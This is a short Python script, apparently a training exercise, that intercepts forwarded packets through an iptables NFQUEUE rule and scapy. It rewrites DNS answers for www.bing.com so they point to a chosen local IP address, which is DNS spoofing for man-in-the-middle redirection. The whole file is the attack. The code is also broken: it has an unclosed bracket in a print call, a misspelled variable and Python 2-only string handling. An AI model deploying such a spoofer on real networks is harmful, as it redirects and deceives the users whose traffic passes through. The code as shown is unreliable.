#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #modifie packet to scapy structure in order to easily access layers inside of packet
    if scapy_packet.haslayer(scapy.DNSRR): #Checl for DNS Response
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print(["[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15") #You'll set in dns response rrname to be sam as qname which is bing.com and set fake ip address for rdata field
            scapy_packet[scapy.DNS].an = answer #Go into DNS layer and modify an(answer) field
            scapy_packet[scapy.DNS].ancount = 1 #Numbers of answers
            #Delete lenght and checksum field because it can corrupt packet scapy will automatically calcualte those two fields based on our changes
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum

            #Convert scapy packet to string, convertion what you have done was neccessary because it's much easier to see and access layers using scapy
            pcaket.set_payload(str(scapy_packet))
        print(scapy_packet.show()) #Show all layers and fields 
    packet.accept()

#Create Instance of NetfilterQueue Object
queue = netfilterqueue.NetfilterQueue() 
#Connect QueueNetfilter Obj with queue which is created with iptable command <iptables -I FORWARD -j NFQUEUE --queue-num 0 // ALso define process_packer callback functuion
queue.bind(0, process_packet)
queue.run() #TO run created queue
